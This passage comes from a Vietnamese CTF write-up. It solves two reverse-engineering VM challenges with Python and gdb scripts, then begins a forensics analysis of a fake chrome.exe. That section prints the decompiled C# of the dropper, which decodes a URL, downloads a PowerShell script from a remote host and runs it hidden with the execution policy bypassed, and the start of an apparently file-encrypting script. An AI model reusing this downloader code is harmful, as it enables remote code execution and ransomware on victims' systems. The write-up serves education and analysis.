                print("DONE")
                break
            i = mem[0]
            a1 = mem[i]
            a2 = mem[i + 1]
            a3 = mem[i + 2]
            
            tmp = (~(mem[a1] | mem[a2])) & 0xffff
            
            mem[a3] = tmp
            mem[1] = ((tmp >> 15) & 1) | ((tmp & 0x7FFF) << 1)
            mem[0] = i + 3
            if a1 >= 60001 and a1 < 60017 and a2 >= 60001 and a2 < 60017:
                f.write(f"{i}    NOR   {chr(mem[a1])},  {chr(mem[a2])} -->  {mem[a3]}\t(key[{i % len(key)}])\n")
            else:
                f.write(f"{i}    NOR   {mem[a1]},  {mem[a2]} -->  {mem[a3]}\t(mem[{a3}])\n")
        return mem[60100]

key = "qwertyuiopasdfgh"

if not (len(key) == 16):
    print("Incorrect format!")
    sys.exit(1)

if VM(key.encode()) == 0:
    print("Correct!, wraps your key with HCMUS-CTF{}")
else:
    print("Incorrect key!")
```

![image](https://hackmd.io/_uploads/SyMO-OuOgl.png)

Quan s√°t k·∫øt qu·∫£ disassembler c√≥ th·ªÉ th·∫•y `mem[60100]` xu·∫•t hi·ªán 16 l·∫ßn t∆∞∆°ng ·ª©ng v·ªõi 16 byte key, nh∆∞ v·∫≠y c√≥ th·ªÉ ng·∫ßm ƒëo√°n ƒë∆∞·ª£c 1 byte key s·∫Ω ƒë∆∞·ª£c m√£ h√≥a v√† n·∫øu ƒë√∫ng th√¨ tr·∫£ v·ªÅ 0.
Brute force t·ª´ng byte key ƒë·ªÉ gi·∫£i:
```python
import pickle
from string import ascii_letters, digits, punctuation

m = []
with open("image.bin", "rb") as f:
    m = pickle.load(f)
key = [0] * 16
chars = ascii_letters + digits + punctuation
for j in range(16):
    for c in chars:
        mem = m.copy()
        mem[60001:60017] = key.copy()
        mem[60001+j] = ord(c)
        cnt = 0
        found = False
        while True:
            if mem[4] == 1:
                break
            i = mem[0]
            a1 = mem[i]
            a2 = mem[i + 1]
            a3 = mem[i + 2]
            
            tmp = (~(mem[a1] | mem[a2])) & 0xffff
            
            mem[a3] = tmp
            mem[1] = ((tmp >> 15) & 1) | ((tmp & 0x7FFF) << 1)
            mem[0] = i + 3

            if a3 == 60100:
                cnt += 1
                if cnt == j+1 and tmp == 0:
                    found = True
                    key[j] = ord(c)
                    print(c)
                    break
                
        if found:
            break
print(bytes(key).decode())
# 0nly_0ne_inst???
```
> `HCMUS-CTF{0nly_0ne_inst???}`


### Reverse/Just another VM

Ti·∫øp t·ª•c l√† 1 challenge VM.

![image](https://hackmd.io/_uploads/HyBvGl9Kee.png)

Debug v√† trace th√¨ h√†m n√†y s·∫Ω th·ª±c hi·ªán check key:

```cpp
void __cdecl Machine::OneInstruction(Machine *const this, Instruction *instr)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // ebx
  int v7; // eax
  int v8; // esi
  int v9; // ebx
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int extra; // ebx
  int v14; // esi
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int raw; // [esp+28h] [ebp-A0h] BYREF
  int value; // [esp+2Ch] [ebp-9Ch] BYREF
  int nextLoadReg; // [esp+30h] [ebp-98h]
  int nextLoadValue; // [esp+34h] [ebp-94h]
  int pcAfter; // [esp+38h] [ebp-90h]
  OpString *str; // [esp+3Ch] [ebp-8Ch]
  int sum; // [esp+40h] [ebp-88h]
  unsigned int rs; // [esp+44h] [ebp-84h]
  unsigned int rt; // [esp+48h] [ebp-80h]
  int tmp; // [esp+4Ch] [ebp-7Ch]
  int byte; // [esp+50h] [ebp-78h]
  unsigned int imm; // [esp+54h] [ebp-74h]
  int diff; // [esp+58h] [ebp-70h]
  char buf[80]; // [esp+5Ch] [ebp-6Ch] BYREF
  unsigned int v45; // [esp+ACh] [ebp-1Ch]

  v45 = __readgsdword(0x14u);
  nextLoadReg = 0;
  nextLoadValue = 0;
  if ( Machine::ReadMem(this, this->registers[34], 4, &raw) )
  {
    instr->value = raw;
    Instruction::Decode(instr);
    if ( Debug::IsEnabled(debug, 109) )
    {
      str = (OpString *)(16 * instr->opCode + 134624448);
      if ( instr->opCode > 63 )
      {
        v2 = std::operator<<<std::char_traits<char>>(&std::cerr, "Assertion failed: line ");
        v3 = std::ostream::operator<<(v2, 142);
        v4 = std::operator<<<std::char_traits<char>>(v3, " file ");
        v5 = std::operator<<<std::char_traits<char>>(v4, "../machine/mipssim.cc");
        std::operator<<<std::char_traits<char>>(v5, "\n");
        Abort();
      }
      v6 = this->registers[34];
      v7 = std::operator<<<std::char_traits<char>>(&std::cout, "At PC = ");
      std::ostream::operator<<(v7, v6);
      v8 = TypeToReg(str->args[2], instr);
      v9 = TypeToReg(str->args[1], instr);
      v10 = TypeToReg(str->args[0], instr);
      sprintf(buf, str->format, v10, v9, v8);
      v11 = std::operator<<<std::char_traits<char>>(&std::cout, "\t");
      v12 = std::operator<<<std::char_traits<char>>(v11, buf);
      std::operator<<<std::char_traits<char>>(v12, "\n");
    }
    pcAfter = this->registers[35] + 4;
    switch ( instr->opCode )
    {
      case 1:
        sum = this->registers[instr->rs] + this->registers[instr->rt];
        if ( (this->registers[instr->rs] ^ this->registers[instr->rt]) >= 0 && (sum ^ this->registers[instr->rs]) < 0 )
          goto LABEL_133;
        this->registers[instr->rd] = sum;
        goto LABEL_171;
      case 2:
        sum = this->registers[instr->rs] + instr->extra;
        if ( (this->registers[instr->rs] ^ instr->extra) >= 0 && (sum ^ instr->extra) < 0 )
          goto LABEL_133;
        this->registers[instr->rt] = sum;
        goto LABEL_171;
      case 3:
        this->registers[instr->rt] = instr->extra + this->registers[instr->rs];
        goto LABEL_171;
      case 4:
        this->registers[instr->rd] = this->registers[instr->rt] + this->registers[instr->rs];
        goto LABEL_171;
      case 5:
        this->registers[instr->rd] = this->registers[instr->rt] & this->registers[instr->rs];
        goto LABEL_171;
      case 6:
        this->registers[instr->rt] = (unsigned __int16)instr->extra & this->registers[instr->rs];
        goto LABEL_171;
      case 7:
        if ( this->registers[instr->rs] == this->registers[instr->rt] )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 8:
        goto LABEL_22;
      case 9:
        this->registers[31] = this->registers[35] + 4;
LABEL_22:
        if ( this->registers[instr->rs] >= 0 )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 0xA:
        if ( this->registers[instr->rs] > 0 )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 0xB:
        if ( this->registers[instr->rs] <= 0 )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 0xC:
        goto LABEL_32;
      case 0xD:
        this->registers[31] = this->registers[35] + 4;
LABEL_32:
        if ( this->registers[instr->rs] < 0 )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 0xE:
        if ( this->registers[instr->rs] != this->registers[instr->rt] )
          pcAfter = this->registers[35] + 4 * instr->extra;
        goto LABEL_171;
      case 0x10:
        if ( this->registers[instr->rt] )
        {
          this->registers[33] = this->registers[instr->rs] / this->registers[instr->rt];
          this->registers[32] = this->registers[instr->rs] % this->registers[instr->rt];
        }
        else
        {
          this->registers[33] = 0;
          this->registers[32] = 0;
        }
        goto LABEL_171;
      case 0x11:
        rs = this->registers[instr->rs];
        rt = this->registers[instr->rt];
        if ( rt )
        {
          this->registers[33] = rs / rt;
          tmp = rs % rt;
          this->registers[32] = rs % rt;
        }
        else
        {
          this->registers[33] = 0;
          this->registers[32] = 0;
        }
        goto LABEL_171;
      case 0x12:
        goto LABEL_45;
      case 0x13:
        this->registers[31] = this->registers[35] + 4;
LABEL_45:
        pcAfter = pcAfter & 0xF0000000 | (4 * instr->extra);
        goto LABEL_171;
      case 0x14:
        this->registers[instr->rd] = this->registers[35] + 4;
        goto LABEL_47;
      case 0x15:
LABEL_47:
        pcAfter = this->registers[instr->rs];
        goto LABEL_171;
      case 0x16:
      case 0x17:
        tmp = this->registers[instr->rs] + instr->extra;
        if ( !Machine::ReadMem(this, tmp, 1, &value) )
          return;
        if ( (value & 0x80) != 0 && instr->opCode == 22 )
          value |= 0xFFFFFF00;
        else
          value = (unsigned __int8)value;
        nextLoadReg = instr->rt;
        nextLoadValue = value;
        goto LABEL_171;
      case 0x18:
      case 0x19:
        tmp = this->registers[instr->rs] + instr->extra;
        if ( (tmp & 1) != 0 )
          goto LABEL_55;
        if ( !Machine::ReadMem(this, tmp, 2, &value) )
          return;
        if ( (value & 0x8000) != 0 && instr->opCode == 24 )
          value |= 0xFFFF0000;
        else
          value = (unsigned __int16)value;
        nextLoadReg = instr->rt;
        nextLoadValue = value;
        goto LABEL_171;
      case 0x1A:
        if ( Debug::IsEnabled(debug, 109) )
        {
          extra = instr->extra;
          v14 = instr->rt;
          v15 = std::operator<<<std::char_traits<char>>(&std::cerr, "Executing: LUI r");
          v16 = std::operator<<<std::char_traits<char>>(v15, v14);
          v17 = std::operator<<<std::char_traits<char>>(v16, ", ");
          v18 = std::ostream::operator<<(v17, extra);
          std::operator<<<std::char_traits<char>>(v18, "\n");
        }
        this->registers[instr->rt] = instr->extra << 16;
        goto LABEL_171;
      case 0x1B:
        tmp = this->registers[instr->rs] + instr->extra;
        if ( (tmp & 3) != 0 )
        {
LABEL_55:
          Machine::RaiseException(this, ExceptionType::AddressErrorException, tmp);
          return;
        }
        if ( !Machine::ReadMem(this, tmp, 4, &value) )
          return;
        nextLoadReg = instr->rt;
        nextLoadValue = value;
        goto LABEL_171;
      case 0x1C:
        tmp = this->registers[instr->rs] + instr->extra;
        byte = tmp & 3;
        if ( !Machine::ReadMem(this, tmp - byte, 4, &value) )
          return;
        if ( this->registers[37] == instr->rt )
          nextLoadValue = this->registers[38];
        else
          nextLoadValue = this->registers[instr->rt];
        v19 = 3 - byte;
        if ( byte == 2 )
        {
          nextLoadValue = (value << 8) | (unsigned __int8)nextLoadValue;
        }
        else if ( v19 > 1 )
        {
          if ( v19 == 2 )
          {
            nextLoadValue = (value << 16) | (unsigned __int16)nextLoadValue;
          }
          else if ( v19 == 3 )
          {
            nextLoadValue = nextLoadValue & 0xFFFFFF | (value << 24);
          }
        }
        else if ( !v19 )
        {
          nextLoadValue = value;
        }
        nextLoadReg = instr->rt;
        goto LABEL_171;
      case 0x1D:
        tmp = this->registers[instr->rs] + instr->extra;
        byte = tmp & 3;
        if ( !Machine::ReadMem(this, tmp - byte, 4, &value) )
          return;
        if ( this->registers[37] == instr->rt )
          nextLoadValue = this->registers[38];
        else
          nextLoadValue = this->registers[instr->rt];
        v20 = 3 - byte;
        if ( byte == 2 )
        {
          HIWORD(v22) = HIWORD(nextLoadValue);
          LOWORD(v22) = 0;
          nextLoadValue = v22 | HIWORD(value);
        }
        else if ( v20 > 1 )
        {
          if ( v20 == 2 )
          {
            nextLoadValue = nextLoadValue & 0xFF000000 | ((unsigned int)value >> 8);
          }
          else if ( v20 == 3 )
          {
            nextLoadValue = value;
          }
        }
        else if ( !v20 )
        {
          v21 = nextLoadValue;
          LOBYTE(v21) = 0;
          nextLoadValue = v21 | HIBYTE(value);
        }
        nextLoadReg = instr->rt;
        goto LABEL_171;
      case 0x1F:
        this->registers[instr->rd] = this->registers[32];
        goto LABEL_171;
      case 0x20:
        this->registers[instr->rd] = this->registers[33];
        goto LABEL_171;
      case 0x22:
        this->registers[32] = this->registers[instr->rs];
        goto LABEL_171;
      case 0x23:
        this->registers[33] = this->registers[instr->rs];
        goto LABEL_171;
      case 0x24:
        Mult(this->registers[instr->rs], this->registers[instr->rt], 1, &this->registers[32], &this->registers[33]);
        goto LABEL_171;
      case 0x25:
        Mult(this->registers[instr->rs], this->registers[instr->rt], 0, &this->registers[32], &this->registers[33]);
        goto LABEL_171;
      case 0x26:
        this->registers[instr->rd] = ~(this->registers[instr->rs] | this->registers[instr->rt]);
        goto LABEL_171;
      case 0x27:
        this->registers[instr->rd] = this->registers[instr->rt] | this->registers[instr->rs];
        goto LABEL_171;
      case 0x28:
        this->registers[instr->rt] = (unsigned __int16)instr->extra | this->registers[instr->rs];
        goto LABEL_171;
      case 0x2A:
        if ( Machine::WriteMem(this, this->registers[instr->rs] + instr->extra, 1, this->registers[instr->rt]) )
          goto LABEL_171;
        return;
      case 0x2B:
        if ( Machine::WriteMem(this, this->registers[instr->rs] + instr->extra, 2, this->registers[instr->rt]) )
          goto LABEL_171;
        return;
      case 0x2C:
        this->registers[instr->rd] = this->registers[instr->rt] << instr->extra;
        goto LABEL_171;
      case 0x2D:
        this->registers[instr->rd] = this->registers[instr->rt] << (this->registers[instr->rs] & 0x1F);
        goto LABEL_171;
      case 0x2E:
        this->registers[instr->rd] = this->registers[instr->rs] < this->registers[instr->rt];
        goto LABEL_171;
      case 0x2F:
        this->registers[instr->rt] = this->registers[instr->rs] < instr->extra;
        goto LABEL_171;
      case 0x30:
        rs = this->registers[instr->rs];
        imm = instr->extra;
        this->registers[instr->rt] = rs < imm;
        goto LABEL_171;
      case 0x31:
        rs = this->registers[instr->rs];
        rt = this->registers[instr->rt];
        this->registers[instr->rd] = rs < rt;
        goto LABEL_171;
      case 0x32:
        this->registers[instr->rd] = this->registers[instr->rt] >> instr->extra;
        goto LABEL_171;
      case 0x33:
        this->registers[instr->rd] = this->registers[instr->rt] >> (this->registers[instr->rs] & 0x1F);
        goto LABEL_171;
      case 0x34:
        tmp = this->registers[instr->rt];
        tmp >>= instr->extra;
        this->registers[instr->rd] = tmp;
        goto LABEL_171;
      case 0x35:
        tmp = this->registers[instr->rt];
        tmp >>= this->registers[instr->rs] & 0x1F;
        this->registers[instr->rd] = tmp;
        goto LABEL_171;
      case 0x36:
        diff = this->registers[instr->rs] - this->registers[instr->rt];
        if ( (this->registers[instr->rs] ^ this->registers[instr->rt]) >= 0 || (diff ^ this->registers[instr->rs]) >= 0 )
        {
          this->registers[instr->rd] = diff;
LABEL_171:
          Machine::DelayedLoad(this, nextLoadReg, nextLoadValue);
          this->registers[36] = this->registers[34];
          this->registers[34] = this->registers[35];
          this->registers[35] = pcAfter;
        }
        else
        {
LABEL_133:
          Machine::RaiseException(this, ExceptionType::OverflowException, 0);
        }
        break;
      case 0x37:
        this->registers[instr->rd] = this->registers[instr->rs] - this->registers[instr->rt];
        goto LABEL_171;
      case 0x38:
        if ( Machine::WriteMem(this, this->registers[instr->rs] + instr->extra, 4, this->registers[instr->rt]) )
          goto LABEL_171;
        return;
      case 0x39:
        tmp = this->registers[instr->rs] + instr->extra;
        byte = tmp & 3;
        if ( Machine::ReadMem(this, tmp - byte, 4, &value) )
        {
          v23 = 3 - byte;
          if ( byte == 2 )
          {
            value = value & 0xFF000000 | ((unsigned int)this->registers[instr->rt] >> 8);
          }
          else if ( v23 > 1 )
          {
            if ( v23 == 2 )
            {
              HIWORD(v24) = HIWORD(value);
              LOWORD(v24) = 0;
              value = v24 | HIWORD(this->registers[instr->rt]);
            }
            else if ( v23 == 3 )
            {
              v25 = value;
              LOBYTE(v25) = 0;
              value = v25 | HIBYTE(this->registers[instr->rt]);
            }
          }
          else if ( !v23 )
          {
            value = this->registers[instr->rt];
          }
          if ( Machine::WriteMem(this, tmp - byte, 4, value) )
            goto LABEL_171;
        }
        return;
      case 0x3A:
        tmp = this->registers[instr->rs] + instr->extra;
        byte = tmp & 3;
        if ( Machine::ReadMem(this, tmp - byte, 4, &value) )
        {
          v26 = 3 - byte;
          if ( byte == 2 )
          {
            value = (unsigned __int16)value | (this->registers[instr->rt] << 16);
          }
          else if ( v26 > 1 )
          {
            if ( v26 == 2 )
            {
              value = (unsigned __int8)value | (this->registers[instr->rt] << 8);
            }
            else if ( v26 == 3 )
            {
              value = this->registers[instr->rt];
            }
          }
          else if ( !v26 )
          {
            value = value & 0xFFFFFF | (this->registers[instr->rt] << 24);
          }
          if ( Machine::WriteMem(this, tmp - byte, 4, value) )
            goto LABEL_171;
        }
        return;
      case 0x3B:
        this->registers[instr->rd] = this->registers[instr->rt] ^ this->registers[instr->rs];
        goto LABEL_171;
      case 0x3C:
        this->registers[instr->rt] = (unsigned __int16)instr->extra ^ this->registers[instr->rs];
        goto LABEL_171;
      case 0x3D:
        Machine::RaiseException(this, ExceptionType::SyscallException, 0);
        return;
      case 0x3E:
      case 0x3F:
        Machine::RaiseException(this, ExceptionType::IllegalInstrException, 0);
        return;
      default:
        v27 = std::operator<<<std::char_traits<char>>(&std::cerr, "Assertion failed: line ");
        v28 = std::ostream::operator<<(v27, 688);
        v29 = std::operator<<<std::char_traits<char>>(v28, " file ");
        v30 = std::operator<<<std::char_traits<char>>(v29, "../machine/mipssim.cc");
        std::operator<<<std::char_traits<char>>(v30, "\n");
        Abort();
    }
  }
}
```

Vi·∫øt 1 script disasembler ƒë∆°n gi·∫£n vm:

```python
import gdb
from collections import Counter

ge = gdb.execute
gp = gdb.parse_and_eval

ge("start")
ge("b *0x0804FCCF") # case
addr_case = {
    0x0804FCD1: 1,                                                                                                                      
    0x0804FDAD: 2,
    0x0804FE59: 3,
    0x0804FE9B: 4,
    0x0804FEED: 5,
    0x0804FF3F: 6,
    0x0804FF84: 7,
    0x0804FFFA: 8,
    0x0804FFDF: 9,
    0x0805003C: 10,
    0x0805007E: 11,
    0x080500DB: 12,
    0x080500C0: 13,
    0x0805011D: 14,
    0x08050178: 16,
    0x08050243: 17,
    0x0805030B: 18,
    0x080502F0: 19,
    0x08050331: 20,
    0x08050359: 21,
    0x0805037D: 23,
    0x0805043A: 25,
    0x08050523: 26,
    0x080505CD: 27,
    0x08050677: 28,
    0x080507D0: 29,
    0x0805092D: 31,
    0x08050957: 32,
    0x08050981: 34,
    0x080509AB: 35,
    0x080509D5: 36,
    0x08050A40: 37,
    0x08050AAB: 38,
    0x08050B01: 39,
    0x08050B53: 40,
    0x08050B98: 42,
    0x08050C04: 43,
    0x08050C70: 44,
    0x08050CB6: 45,
    0x08050D0F: 46,
    0x08050D89: 47,
    0x08050DF3: 48,
    0x08050E6D: 49,
    0x08050EF7: 50,
    0x08050F3D: 51,
    0x08050F96: 52,
    0x08050FE1: 53,
    0x0805103F: 54,
    0x08051114: 55,
    0x08051166: 56,
    0x080511D2: 57,
    0x0805135F: 58,
    0x08051508: 59,
    0x0805155A: 60,
    0x080514E5: 61,
    0x0805159C: 63
}
op_dis = {
    1: "ADD", 2: "ADDI", 3: "ADDIU", 4: "SUB", 5: "AND", 6: "ANDI",
    7: "CMP", 8: "JLE", 9: "JGE", 10: "BGTZ", 11: "BLTZ", 12: "JNE",
    13: "JAL", 14: "J", 16: "DIV", 17: "DIVU", 18: "J", 19: "JAL",
    20: "JALR", 21: "JR", 22: "LB", 23: "LB", 24: "LH", 25: "LH",
    26: "LUI", 27: "LW", 28: "LWL", 29: "LWR", 31: "MFLO", 32: "MFHI",
    34: "MTLO", 35: "MTHI", 36: "MULT", 37: "MULTU", 38: "NOR", 39: "OR",
    40: "ORI", 42: "SB", 43: "SH", 44: "SLL", 45: "SLLV", 46: "SLT",
    47: "SLTI", 48: "SLTU", 49: "SLTIU", 50: "SRA", 51: "SRAV",
    52: "SRAI", 53: "SRLV", 54: "SUB", 55: "SUBU", 56: "SW",
    57: "SWL", 58: "SWR", 59: "XOR", 60: "XORI", 61: "SYSCALL",
    62: "BREAK", 63: "ILLEGAL"
}

op = []
pc = 0
pr = ''
key = "abcdefghijklmnop"
ge(f"r <<< {key}")
while True:
    try:
        eax = int(gp("$eax"))
        if eax in addr_case:
            op.append(addr_case[eax])
            ge("c")
    except:
        with open("disasm.txt", "w") as f:
            cnts = Counter(op)
            for v, cnt in cnts.items():
                f.write(f"{op_dis.get(v, 'UNK')}({v}) : {cnt}\n")
            f.write("\n")
            for o in op:
                f.write(f"{op_dis.get(o, 'UNK')}\n")
            f.write(f"{op_dis.get(o, 'UNK')}")
        exit()
```

ƒê√¢y l√† s·ªë l·ªánh ƒë∆∞·ª£c s·ª≠ d·ª•ng trong vm n√†y:

```
JAL(19): 35
SLL(44): 372
ADDIU(3): 150
SW(56): 73
SUB(4): 83
JR(21): 33
LUI(26): 34
LW(27): 179
LB(23): 78
J(14): 51
SYSCALL(61): 31
J(18): 50
SLTI(47): 34
SB(42): 16
XOR(59): 16
SRA(50): 16
CMP(7): 16
```

S∆° l∆∞·ª£c th√¨ t·∫°i case 61 s·∫Ω c√≥ 2 gi√° tr·ªã syscall `0, 1` t∆∞∆°ng ·ª©ng v·ªõi write v√† read input.

Debug v√† trace th√¨ 5 gi√° tr·ªã 61 ƒë·∫ßu ti√™n ·ª©ng v·ªõi syscall `1` s·∫Ω write `Key: `
17 gi√° tr·ªã 61 ti·∫øp theo ·ª©ng v·ªõi syscall `0` s·∫Ω ƒë·ªçc key nh·∫≠p v√†o.
9 gi√° tr·ªã 61 cu·ªëi c√πng s·∫Ω in ra `Incorrect` v·ªõi test key nh·∫≠p sai.
Nh√¨n v√†o s·ªë l∆∞·ª£ng key ta c√≥ th·ªÉ ƒëo√°n c∆° b·∫£n vm n√†y s·∫Ω l√†m g√¨ v·ªõi key nh·∫≠p v√†o.
Ch√∫ √Ω v√†o nh·ªØng ƒëo·∫°n case xu·∫•t hi·ªán 16 l·∫ßn (`XOR, SB, SRA, CMP`) ·ª©ng v·ªõi x·ª≠ l√Ω 16 byte key (byte 17 l√† `\n`) s·∫Ω t·∫≠p trung trace v√†o ƒë√≥.

Test v·ªõi key `abcdefghijklmnop`.

1 l∆∞u √Ω l√† byte key ƒë∆∞·ª£c ƒë·ªçc s·∫Ω xor v·ªõi 0x49 v√† + 9:

![image](https://hackmd.io/_uploads/SJanWi5Fgx.png)

Store byte key v√†o mem:

![image](https://hackmd.io/_uploads/SkdI9icFlg.png)

![image](https://hackmd.io/_uploads/BJrYqi5tgl.png)


Xor v·ªõi `xor_data` t·∫°i ecx (`((ord('a') ^ 0x49) + 9) ^ 0x75 = 0x31 ^ 0x75 = 0x44`):

![image](https://hackmd.io/_uploads/S17NMsqtgl.png)

![image](https://hackmd.io/_uploads/S1X6Qo9Yxl.png)

Sau ƒë√≥ so s√°nh v·ªõi cipher text t·∫°i eax:

![image](https://hackmd.io/_uploads/HkX7Vo5txl.png)

Nh∆∞ v·∫≠y lu·ªìng check key ƒë∆°n gi·∫£n l√† xor byte v·ªõi 0x49 v√† + 9, sau ƒë√≥ xor v·ªõi m·∫£ng xor_data t·∫°i ecx, cu·ªëi c√πng so s√°nh v·ªõi cipher text t·∫°i eax.

Script dump ra xor_data v√† cipher:

```python
import gdb

ge = gdb.execute
gp = gdb.parse_and_eval

ge("start")
ge("b *0x0804FCCF") # case
ge("b *0x08051547") # xor
ge("b *0x0804FFB6") # cmp
addr_case = {
    0x0804FCD1: 1,                                                                                                                      
    0x0804FDAD: 2,
    0x0804FE59: 3,
    0x0804FE9B: 4,
    0x0804FEED: 5,
    0x0804FF3F: 6,
    0x0804FF84: 7,
    0x0804FFFA: 8,
    0x0804FFDF: 9,
    0x0805003C: 10,
    0x0805007E: 11,
    0x080500DB: 12,
    0x080500C0: 13,
    0x0805011D: 14,
    0x08050178: 16,
    0x08050243: 17,
    0x0805030B: 18,
    0x080502F0: 19,
    0x08050331: 20,
    0x08050359: 21,
    0x0805037D: 23,
    0x0805043A: 25,
    0x08050523: 26,
    0x080505CD: 27,
    0x08050677: 28,
    0x080507D0: 29,
    0x0805092D: 31,
    0x08050957: 32,
    0x08050981: 34,
    0x080509AB: 35,
    0x080509D5: 36,
    0x08050A40: 37,
    0x08050AAB: 38,
    0x08050B01: 39,
    0x08050B53: 40,
    0x08050B98: 42,
    0x08050C04: 43,
    0x08050C70: 44,
    0x08050CB6: 45,
    0x08050D0F: 46,
    0x08050D89: 47,
    0x08050DF3: 48,
    0x08050E6D: 49,
    0x08050EF7: 50,
    0x08050F3D: 51,
    0x08050F96: 52,
    0x08050FE1: 53,
    0x0805103F: 54,
    0x08051114: 55,
    0x08051166: 56,
    0x080511D2: 57,
    0x0805135F: 58,
    0x08051508: 59,
    0x0805155A: 60,
    0x080514E5: 61,
    0x0805159C: 63
}

vm = []
key = "abcdefghijklmnop"
xor_data = []
ct = []
vm = []
ge(f"r <<< {key}")
while True:
    try:
        eax = int(gp("$eax"))
        if eax in addr_case:
            if addr_case[eax] == 59:
                ge("c")
                eax = hex(gp("$eax"))
                ecx = hex(gp("$ecx"))
                xor_data.append(ecx)
                vm.append(f"xor {ecx}, {eax}")
            elif addr_case[eax] == 7:
                ge("c")
                eax = hex(gp("$eax"))
                edx = hex(gp("$edx"))
                ct.append(eax)
                vm.append(f"cmp {edx}, {eax}")
            ge("c")
    except:
        print("\nKey modify: ", end='')
        for k in key:
            print(hex((ord(k)^0x49)+9), end=', ')
        print("\n\nVM:")
        for v in vm:
            print(v)
        print(f"\nxor_data = {xor_data}")
        print(f"\nct = {ct}")
        exit()
```

T·ª´ng byte key ƒë∆∞·ª£c bi·∫øn ƒë·ªïi n√™n d·ªÖ d√†ng brute force:

```python
from string import ascii_letters, digits, punctuation


# VM:
# xor 0x75, 0x31
# cmp 0x44, 0x31
# xor 0xb4, 0x34
# cmp -0x80, 0x32
# xor 0x3, 0x33
# cmp 0x30, 0x32
# xor 0x1d, 0x36
# cmp 0x2b, 0x33
# xor 0x2c, 0x35
# cmp 0x19, 0x33
# xor 0x7b, 0x38
# cmp 0x43, 0x33
# xor 0x19, 0x37
# cmp 0x2e, 0x34
# xor 0x2b, 0x2a
# cmp 0x1, 0x34
# xor 0x1d, 0x29
# cmp 0x34, 0x34
# xor 0x77, 0x2c
# cmp 0x5b, 0x34
# xor 0x5, 0x2b
# cmp 0x2e, 0x35
# xor 0x73, 0x2e
# cmp 0x5d, 0x35
# xor 0x2a, 0x2d
# cmp 0x7, 0x35
# xor 0x1c, 0x30
# cmp 0x2c, 0x35
# xor 0x73, 0x2f
# cmp 0x5c, 0x35
# xor 0x49, 0x42
# cmp 0xb, 0x36

xor_data = ['0x75', '0xb4', '0x3', '0x1d', '0x2c', '0x7b', '0x19', '0x2b', '0x1d', '0x77', '0x5', '0x73', '0x2a', '0x1c', '0x73', '0x49']

ct = ['0x31', '0x32', '0x32', '0x33', '0x33', '0x33', '0x34', '0x34', '0x34', '0x34', '0x35', '0x35', '0x35', '0x35', '0x35', '0x36']

key = ''
chars = ascii_letters + digits + punctuation
for x, e in zip(xor_data, ct):
    for c in chars:
        km = (ord(c) ^ 0x49) + 9
        if (km ^ int(x, 16)) == int(e, 16):
            key += c
            break
# print(len(key))
print(key)
# r4al_vm_isnt_it?
```

> `HCMUS-CTF{r4al_vm_isnt_it?}`

### Forensics/Download Chrome

> User ran a strange file. Suspicious behavior detected. Find the flag.

Challenge m√¥ t·∫£ user ƒë√£ ch·∫°y 1 file l·∫° v·ªõi h√†nh vi ƒë√°ng ng·ªù tr√™n h·ªá th·ªëng.
Ph√¢n t√≠ch file `traffic.pcapng` th√¨ th·∫•y c√°c file kh·∫£ nghi, export ra ƒë·ªÉ theo d√µi:

![image](https://hackmd.io/_uploads/BkeqszqOel.png)


ƒê√¢y l√† `chrome.exe`

![image](https://hackmd.io/_uploads/SkuZnMqulg.png)

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

// Token: 0x02000002 RID: 2
internal class Program
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	private static string XorDecode(byte[] data, string key)
	{
		byte[] array = new byte[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			array[i] = (data[i] ^ (byte)key[i % key.Length]);
		}
		return Encoding.UTF8.GetString(array);
	}

	// Token: 0x06000002 RID: 2 RVA: 0x000020A4 File Offset: 0x000002A4
	private static void Main()
	{
		try
		{
			ServicePointManager.SecurityProtocol = 3072;
			string text = Path.Combine(Path.GetTempPath(), "temp_script.ps1");
			string text2 = "ABcZBUlMW1cLAhwEXltDREpQWlMACgcFWFNdWgMMAwNAQ1pQBA8=";
			string key = "hcmusctf2025";
			string s = text2.Replace('@', 'a');
			byte[] data = Convert.FromBase64String(s);
			string text3 = Program.XorDecode(data, key);
			Console.WriteLine("URL: " + text3);
			using (WebClient webClient = new WebClient())
			{
				string s2 = webClient.DownloadString(text3);
				byte[] data2 = Convert.FromBase64String(s2);
				string text4 = Program.XorDecode(data2, key);
				Console.WriteLine("Content: ");
				Console.WriteLine(text4);
				File.WriteAllText(text, text4);
			}
			using (Process process = Process.Start(new ProcessStartInfo
			{
				FileName = "powershell.exe",
				Arguments = "-ExecutionPolicy Bypass -File \"" + text + "\"",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			}))
			{
				string str = process.StandardOutput.ReadToEnd();
				string text5 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				Console.WriteLine("[Output] " + str);
				if (!string.IsNullOrWhiteSpace(text5))
				{
					Console.WriteLine("[Error] " + text5);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("L·ªói: " + ex.Message);
		}
	}
}

```

File `chrome.exe` n√†y ƒë·∫ßu ti√™n t·∫°o 1 t·ªáp powershall tr·ªëng t√™n l√† `temp_script.ps1`, sau ƒë√≥ gi·∫£i m√£ base64 v√† t·∫£i n·ªôi dung c·ªßa powershell t·∫°i `http://192.168.193.52:50000/powershell` v√† l∆∞u v√†o l·∫°i v√†o t·ªáp r·ªìi th·ª±c thi:

![image](https://hackmd.io/_uploads/rkeLRMq_ex.png)

![image](https://hackmd.io/_uploads/Hyvs0fqOxl.png)

```csharp
        $targetDirectories = @("$env:USERPROFILE")
        $fileExtensionsToEncrypt = @(".txt")
